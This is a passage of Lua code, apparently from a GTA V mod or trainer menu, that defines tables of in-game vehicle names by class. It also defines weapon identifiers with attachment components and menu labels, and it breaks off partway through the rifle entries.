    local Helicopters = { "Akula", "Annihilator", "Buzzard", "Buzzard2", "Cargobob", "Cargobob2", "Cargobob3", "Cargobob4", "Frogger", "Frogger2", "Havok", "Hunter", "Maverick", "Savage", "Seasparrow", "Skylift", "Supervolito", "Supervolito2", "Swift", "Swift2", "Valkyrie", "Valkyrie2", "Volatus"}
    local Industrial = { "Bulldozer", "Cutter", "Dump", "Flatbed", "Guardian", "Handler", "Mixer", "Mixer2", "Rubble", "Tiptruck", "Tiptruck2"}
    local Military = { "APC", "Barracks", "Barracks2", "Barracks3", "Barrage", "Chernobog", "Crusader", "Halftrack", "Khanjali", "Rhino", "Scarab", "Scarab2", "Scarab3", "Thruster", "Trailersmall2"}
    local Motorcycles = { "Akuma", "Avarus", "Bagger", "Bati2", "Bati", "BF400", "Blazer4", "CarbonRS", "Chimera", "Cliffhanger", "Daemon", "Daemon2", "Defiler", "Deathbike", "Deathbike2", "Deathbike3", "Diablous", "Diablous2", "Double", "Enduro", "esskey", "Faggio2", "Faggio3", "Faggio", "Fcr2", "fcr", "gargoyle", "hakuchou2", "hakuchou", "hexer", "innovation", "Lectro", "Manchez", "Nemesis", "Nightblade", "Oppressor", "Oppressor2", "PCJ", "Ratbike", "Ruffian", "Sanchez2", "Sanchez", "Sanctus", "Shotaro", "Sovereign", "Thrust", "Vader", "Vindicator", "Vortex", "Wolfsbane", "zombiea", "zombieb"}
    local muscle = { "Blade", "Buccaneer", "Buccaneer2", "Chino", "Chino2", "clique", "Deviant", "Dominator", "Dominator2", "Dominator3", "Dominator4", "Dominator5", "Dominator6", "Dukes", "Dukes2", "Ellie", "Faction", "faction2", "faction3", "Gauntlet", "Gauntlet2", "Hermes", "Hotknife", "Hustler", "Impaler", "Impaler2", "Impaler3", "Impaler4", "Imperator", "Imperator2", "Imperator3", "Lurcher", "Moonbeam", "Moonbeam2", "Nightshade", "Phoenix", "Picador", "RatLoader", "RatLoader2", "Ruiner", "Ruiner2", "Ruiner3", "SabreGT", "SabreGT2", "Sadler2", "Slamvan", "Slamvan2", "Slamvan3", "Slamvan4", "Slamvan5", "Slamvan6", "Stalion", "Stalion2", "Tampa", "Tampa3", "Tulip", "Vamos,", "Vigero", "Virgo", "Virgo2", "Virgo3", "Voodoo", "Voodoo2", "Yosemite"}
    local OffRoad = {"BFinjection", "Bifta", "Blazer", "Blazer2", "Blazer3", "Blazer5", "Bohdi", "Brawler", "Bruiser", "Bruiser2", "Bruiser3", "Caracara", "DLoader", "Dune", "Dune2", "Dune3", "Dune4", "Dune5", "Insurgent", "Insurgent2", "Insurgent3", "Kalahari", "Kamacho", "LGuard", "Marshall", "Mesa", "Mesa2", "Mesa3", "Monster", "Monster4", "Monster5", "Nightshark", "RancherXL", "RancherXL2", "Rebel", "Rebel2", "RCBandito", "Riata", "Sandking", "Sandking2", "Technical", "Technical2", "Technical3", "TrophyTruck", "TrophyTruck2", "Freecrawler", "Menacer"}
    local Planes = {"AlphaZ1", "Avenger", "Avenger2", "Besra", "Blimp", "blimp2", "Blimp3", "Bombushka", "Cargoplane", "Cuban800", "Dodo", "Duster", "Howard", "Hydra", "Jet", "Lazer", "Luxor", "Luxor2", "Mammatus", "Microlight", "Miljet", "Mogul", "Molotok", "Nimbus", "Nokota", "Pyro", "Rogue", "Seabreeze", "Shamal", "Starling", "Stunt", "Titan", "Tula", "Velum", "Velum2", "Vestra", "Volatol", "Striekforce"}
    local SUVs = {"BJXL", "Baller", "Baller2", "Baller3", "Baller4", "Baller5", "Baller6", "Cavalcade", "Cavalcade2", "Dubsta", "Dubsta2", "Dubsta3", "FQ2", "Granger", "Gresley", "Habanero", "Huntley", "Landstalker", "patriot", "Patriot2", "Radi", "Rocoto", "Seminole", "Serrano", "Toros", "XLS", "XLS2"}
    local Sedans = {"Asea", "Asea2", "Asterope", "Cog55", "Cogg552", "Cognoscenti", "Cognoscenti2", "emperor", "emperor2", "emperor3", "Fugitive", "Glendale", "ingot", "intruder", "limo2", "premier", "primo", "primo2", "regina", "romero", "stafford", "Stanier", "stratum", "stretch", "surge", "tailgater", "warrener", "Washington"}
    local Service = { "Airbus", "Brickade", "Bus", "Coach", "Rallytruck", "Rentalbus", "Taxi", "Tourbus", "Trash", "Trash2", "WastIndr", "PBus2"}
    local Sports = {"Alpha", "Banshee", "Banshee2", "BestiaGTS", "Buffalo", "Buffalo2", "Buffalo3", "Carbonizzare", "Comet2", "Comet3", "Comet4", "Comet5", "Coquette", "Deveste", "Elegy", "Elegy2", "Feltzer2", "Feltzer3", "FlashGT", "Furoregt", "Fusilade", "Futo", "GB200", "Hotring", "Infernus2", "Italigto", "Jester", "Jester2", "Khamelion", "Kurama", "Kurama2", "Lynx", "MAssacro", "MAssacro2", "neon", "Ninef", "ninfe2", "omnis", "Pariah", "Penumbra", "Raiden", "RapidGT", "RapidGT2", "Raptor", "Revolter", "Ruston", "Schafter2", "Schafter3", "Schafter4", "Schafter5", "Schafter6", "Schlagen", "Schwarzer", "Sentinel3", "Seven70", "Specter", "Specter2", "Streiter", "Sultan", "Surano", "Tampa2", "Tropos", "Verlierer2", "ZR380", "ZR3802", "ZR3803"}
    local SportsClassic = {"Ardent", "BType", "BType2", "BType3", "Casco", "Cheetah2", "Cheburek", "Coquette2", "Coquette3", "Deluxo", "Fagaloa", "Gt500", "JB700", "JEster3", "MAmba", "Manana", "Michelli", "Monroe", "Peyote", "Pigalle", "RapidGT3", "Retinue", "Savastra", "Stinger", "Stingergt", "Stromberg", "Swinger", "Torero", "Tornado", "Tornado2", "Tornado3", "Tornado4", "Tornado5", "Tornado6", "Viseris", "Z190", "ZType"}
    local Super = {"Adder", "Autarch", "Bullet", "Cheetah", "Cyclone", "EntityXF", "Entity2", "FMJ", "GP1", "Infernus", "LE7B", "Nero", "Nero2", "Osiris", "Penetrator", "PFister811", "Prototipo", "Reaper", "SC1", "Scramjet", "Sheava", "SultanRS", "Superd", "T20", "Taipan", "Tempesta", "Tezeract", "Turismo2", "Turismor", "Tyrant", "Tyrus", "Vacca", "Vagner", "Vigilante", "Visione", "Voltic", "Voltic2", "Zentorno", "Italigtb", "Italigtb2", "XA21"}
    local Trailer = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local trains = {"Freight", "Freightcar", "Freightcont1", "Freightcont2", "Freightgrain", "Freighttrailer", "TankerCar"}
    local Utility = {"Airtug", "Caddy", "Caddy2", "Caddy3", "Docktug", "Forklift", "Mower", "Ripley", "Sadler", "Scrap", "TowTruck", "Towtruck2", "Tractor", "Tractor2", "Tractor3", "TrailerLArge2", "Utilitruck", "Utilitruck3", "Utilitruck2"}
    local Vans = {"Bison", "Bison2", "Bison3", "BobcatXL", "Boxville", "Boxville2", "Boxville3", "Boxville4", "Boxville5", "Burrito", "Burrito2", "Burrito3", "Burrito4", "Burrito5", "Camper", "GBurrito", "GBurrito2", "Journey", "Minivan", "Minivan2", "Paradise", "pony", "Pony2", "Rumpo", "Rumpo2", "Rumpo3", "Speedo", "Speedo2", "Speedo4", "Surfer", "Surfer2", "Taco", "Youga", "youga2"}
    local CarTypes = {"Boats", "Commercial", "Compacts", "Coupes", "Cycles", "Emergency", "Helictopers", "Industrial", "Military", "Motorcycles", "Muscle", "Off-Road", "Planes", "SUVs", "Sedans", "Service", "Sports", "Sports Classic", "Super", "Trailer", "Trains", "Utility", "Vans"}
    local CarsArray = { boats, Commercial, Compacts, Coupes, cycles, Emergency, Helicopters, Industrial, Military, Motorcycles, muscle, OffRoad, Planes, SUVs, Sedans, Service, Sports, SportsClassic, Super, Trailer, trains, Utility, Vans}
    local Trailers = { "ArmyTanker", "ArmyTrailer", "ArmyTrailer2", "BaleTrailer", "BoatTrailer", "CableCar", "DockTrailer", "Graintrailer", "Proptrailer", "Raketailer", "TR2", "TR3", "TR4", "TRFlat", "TVTrailer", "Tanker", "Tanker2", "Trailerlogs", "Trailersmall", "Trailers", "Trailers2", "Trailers3"}
    local allWeapons={"WEAPON_KNIFE","WEAPON_KNUCKLE","WEAPON_NIGHTSTICK","WEAPON_HAMMER","WEAPON_BAT","WEAPON_GOLFCLUB","WEAPON_CROWBAR","WEAPON_BOTTLE","WEAPON_DAGGER","WEAPON_HATCHET","WEAPON_MACHETE","WEAPON_FLASHLIGHT","WEAPON_SWITCHBLADE","WEAPON_PISTOL","WEAPON_PISTOL_MK2","WEAPON_COMBATPISTOL","WEAPON_APPISTOL","WEAPON_PISTOL50","WEAPON_SNSPISTOL","WEAPON_HEAVYPISTOL","WEAPON_VINTAGEPISTOL","WEAPON_STUNGUN","WEAPON_FLAREGUN","WEAPON_MARKSMANPISTOL","WEAPON_REVOLVER","WEAPON_MICROSMG","WEAPON_SMG","WEAPON_SMG_MK2","WEAPON_ASSAULTSMG","WEAPON_MG","WEAPON_COMBATMG","WEAPON_COMBATMG_MK2","WEAPON_COMBATPDW","WEAPON_GUSENBERG","WEAPON_MACHINEPISTOL","WEAPON_ASSAULTRIFLE","WEAPON_ASSAULTRIFLE_MK2","WEAPON_CARBINERIFLE","WEAPON_CARBINERIFLE_MK2","WEAPON_ADVANCEDRIFLE","WEAPON_SPECIALCARBINE","WEAPON_BULLPUPRIFLE","WEAPON_COMPACTRIFLE","WEAPON_PUMPSHOTGUN","WEAPON_SAWNOFFSHOTGUN","WEAPON_BULLPUPSHOTGUN","WEAPON_ASSAULTSHOTGUN","WEAPON_MUSKET","WEAPON_HEAVYSHOTGUN","WEAPON_DBSHOTGUN","WEAPON_SNIPERRIFLE","WEAPON_HEAVYSNIPER","WEAPON_HEAVYSNIPER_MK2","WEAPON_MARKSMANRIFLE","WEAPON_GRENADELAUNCHER","WEAPON_GRENADELAUNCHER_SMOKE","WEAPON_RPG","WEAPON_STINGER","WEAPON_FIREWORK","WEAPON_HOMINGLAUNCHER","WEAPON_GRENADE","WEAPON_STICKYBOMB","WEAPON_PROXMINE","WEAPON_BZGAS","WEAPON_SMOKEGRENADE","WEAPON_MOLOTOV","WEAPON_FIREEXTINGUISHER","WEAPON_PETROLCAN","WEAPON_SNOWBALL","WEAPON_FLARE","WEAPON_BALL"}
    local l_weapons={Melee={BaseballBat={id="weapon_bat",name="~r~> ~s~Baseball Bat",bInfAmmo=false,mods={}},BrokenBottle={id="weapon_bottle",name="~r~> ~s~Broken Bottle",bInfAmmo=false,mods={}},Crowbar={id="weapon_Crowbar",name="~r~> ~s~Crowbar",bInfAmmo=false,mods={}},Flashlight={id="weapon_flashlight",name="~r~> ~s~Flashlight",bInfAmmo=false,mods={}},GolfClub={id="weapon_golfclub",name="~r~> ~s~Golf Club",bInfAmmo=false,mods={}},BrassKnuckles={id="weapon_knuckle",name="~r~> ~s~Brass Knuckles",bInfAmmo=false,mods={}},Knife={id="weapon_knife",name="~r~> ~s~Knife",bInfAmmo=false,mods={}},Machete={id="weapon_machete",name="~r~> ~s~Machete",bInfAmmo=false,mods={}},Switchblade={id="weapon_switchblade",name="~r~> ~s~Switchblade",bInfAmmo=false,mods={}},Nightstick={id="weapon_nightstick",name="~r~> ~s~Nightstick",bInfAmmo=false,mods={}},BattleAxe={id="weapon_battleaxe",name="~r~> ~s~Battle Axe",bInfAmmo=false,mods={}}},Handguns={Pistol={id="weapon_pistol",name="~r~> ~s~Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},PistolMK2={id="weapon_pistol_mk2",name="~r~> ~s~Pistol MK 2",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_PISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_PISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_PISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_02"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP"},{name="~r~> ~s~Suppessor",id="COMPONENT_AT_PI_SUPP_02"}}}},CombatPistol={id="weapon_combatpistol",name="Combat Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},APPistol={id="weapon_appistol",name="AP Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_APPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_APPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},StunGun={id="weapon_stungun",name="~r~> ~s~Stun Gun",bInfAmmo=false,mods={}},Pistol50={id="weapon_pistol50",name="~r~> ~s~Pistol .50",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_PISTOL50_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_PISTOL50_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},SNSPistol={id="weapon_snspistol",name="~r~> ~s~SNS Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_CLIP_02"}}}},SNSPistolMkII={id="weapon_snspistol_mk2",name="~r~> ~s~SNS Pistol Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SNSPISTOL_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SNSPISTOL_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Mounted Scope",id="COMPONENT_AT_PI_RAIL_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH_03"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_02"},{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP_02"}}}},HeavyPistol={id="weapon_heavypistol",name="~r~> ~s~Heavy Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYPISTOL_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},VintagePistol={id="weapon_vintagepistol",name="~r~> ~s~Vintage Pistol",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_VINTAGEPISTOL_CLIP_02"}},BarrelAttachments={{"Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},FlareGun={id="weapon_flaregun",name="~r~> ~s~Flare Gun",bInfAmmo=false,mods={}},MarksmanPistol={id="weapon_marksmanpistol",name="~r~> ~s~Marksman Pistol",bInfAmmo=false,mods={}},HeavyRevolver={id="weapon_revolver",name="~r~> ~s~Heavy Revolver",bInfAmmo=false,mods={}},HeavyRevolverMkII={id="weapon_revolver_mk2",name="~r~> ~s~Heavy Revolver Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_01"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_REVOLVER_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Compensator",id="COMPONENT_AT_PI_COMP_03"}}}},DoubleActionRevolver={id="weapon_doubleaction",name="~r~> ~s~Double Action Revolver",bInfAmmo=false,mods={}},UpnAtomizer={id="weapon_raypistol",name="~r~> ~s~Up-n-Atomizer",bInfAmmo=false,mods={}}},SMG={MicroSMG={id="weapon_microsmg",name="~r~> ~s~Micro SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MICROSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MICROSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_PI_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},SMG={id="weapon_smg",name="~r~> ~s~SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SMG_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},SMGMkII={id="weapon_smg_mk2",name="~r~> ~s~SMG Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS_SMG"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_SMG_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SB_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SB_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}}}},AssaultSMG={id="weapon_assaultsmg",name="~r~> ~s~Assault SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},CombatPDW={id="weapon_combatpdw",name="~r~> ~s~Combat PDW",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATPDW_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATPDW_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMBATPDW_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MachinePistol={id="weapon_machinepistol",name="~r~> ~s~Machine Pistol ",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_MACHINEPISTOL_CLIP_03"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_PI_SUPP"}}}},MiniSMG={id="weapon_minismg",name="~r~> ~s~Mini SMG",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MINISMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MINISMG_CLIP_02"}}}},UnholyHellbringer={id="weapon_raycarbine",name="~r~> ~s~Unholy Hellbringer",bInfAmmo=false,mods={}}},Shotguns={PumpShotgun={id="weapon_pumpshotgun",name="~r~> ~s~Pump Shotgun",bInfAmmo=false,mods={Flashlight={{"name = Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP"}}}},PumpShotgunMkII={id="weapon_pumpshotgun_mk2",name="~r~> ~s~Pump Shotgun Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},{name="~r~> ~s~Dragon Breath Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Steel Buckshot Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~Flechette Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~Explosive Slugs",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"}}}},SawedOffShotgun={id="weapon_sawnoffshotgun",name="~r~> ~s~Sawed-Off Shotgun",bInfAmmo=false,mods={}},AssaultShotgun={id="weapon_assaultshotgun",name="~r~> ~s~Assault Shotgun",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupShotgun={id="weapon_bullpupshotgun",name="~r~> ~s~Bullpup Shotgun",bInfAmmo=false,mods={Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},Musket={id="weapon_musket",name="~r~> ~s~Musket",bInfAmmo=false,mods={}},HeavyShotgun={id="weapon_heavyshotgun",name="~r~> ~s~Heavy Shotgun",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},DoubleBarrelShotgun={id="weapon_dbshotgun",name="~r~> ~s~Double Barrel Shotgun",bInfAmmo=false,mods={}},SweeperShotgun={id="weapon_autoshotgun",name="~r~> ~s~Sweeper Shotgun",bInfAmmo=false,mods={}}},AssaultRifles={AssaultRifle={id="weapon_assaultrifle",name="~r~> ~s~Assault Rifle",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},AssaultRifleMkII={id="weapon_assaultrifle_mk2",name="~r~> ~s~Assault Rifle Mk II",bInfAmmo=false,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_AR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_AR_BARREL_0"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> 